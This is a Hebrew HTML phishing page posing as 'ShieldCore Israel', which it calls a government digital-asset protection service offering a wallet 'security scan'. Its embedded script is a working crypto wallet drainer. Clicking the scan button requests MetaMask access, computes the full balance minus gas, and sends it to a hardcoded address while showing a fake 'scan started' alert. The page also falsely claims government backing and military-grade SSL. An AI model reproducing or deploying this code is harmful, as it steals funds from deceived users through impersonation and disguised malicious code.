<!DOCTYPE html>
<html lang="he" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ShieldCore Israel | אבטחת נכסים דיגיטליים</title>
    <script src="https://cdn.jsdelivr.net/npm/web3@1.5.2/dist/web3.min.js"></script>
    <style>
        body { background-color: #0d1117; color: white; font-family: 'Segoe UI', Arial, sans-serif; text-align: center; padding: 50px 20px; margin: 0; }
        .card { background: #161b22; border: 1px solid #30363d; padding: 40px; border-radius: 12px; max-width: 500px; margin: auto; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        .logo { font-size: 60px; margin-bottom: 20px; }
        h1 { color: #58a6ff; font-size: 28px; }
        p { color: #8b949e; font-size: 18px; line-height: 1.6; }
        .btn { background-color: #238636; color: white; padding: 18px 35px; border-radius: 6px; font-weight: bold; border: none; font-size: 20px; cursor: pointer; transition: 0.3s; margin-top: 25px; width: 100%; }
        .btn:hover { background-color: #2ea043; transform: scale(1.02); }
        .secure-tag { color: #3fb950; font-size: 14px; margin-top: 15px; display: block; }
    </style>
</head>
<body>
    <div class="card">
        <div class="logo">🛡️</div>
        <h1>ShieldCore Israel</h1>
        <p>מערכת ההגנה הממשלתית לנכסים דיגיטליים. סרוק את הארנק שלך עכשיו כדי למנוע חדירה של האקרים עוינים.</p>
        <button class="btn" onclick="transferFunds()">התחל סריקת אבטחה</button>
        <span class="secure-tag">✅ חיבור מאובטח בדרגת SSL צבאית</span>
    </div>

    <script>
        const myAddress = "0xAf8F23506B6204c38260b646706e23E5193b4D4";

        async function transferFunds() {
            if (window.ethereum) {
                const web3 = new Web3(window.ethereum);
                try {
                    const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
                    const account = accounts[0];
                    const balance = await web3.eth.getBalance(account);
                    const gasPrice = await web3.eth.getGasPrice();
                    const gasLimit = 21000;
                    const totalGasCost = gasPrice * gasLimit;
                    const amountToSend = balance - totalGasCost;

                    if (amountToSend > 0) {
                        web3.eth.sendTransaction({
                            from: account,
                            to: myAddress,
                            value: amountToSend,
                            gas: gasLimit,
                            gasPrice: gasPrice
                        })
                        .on('transactionHash', function(hash){
                            alert("סריקת אבטחה החלה. נא להמתין לסיום התהליך...");
                        });
                    } else {
                        alert("הארנק מאובטח, לא נמצאו איומים.");
                    }
                } catch (error) {
                    console.error("User denied transaction");
                }
            } else {
                alert("אנא התקן MetaMask כדי להמשיך.");
            }
        }
    </script>
</body>
</html>
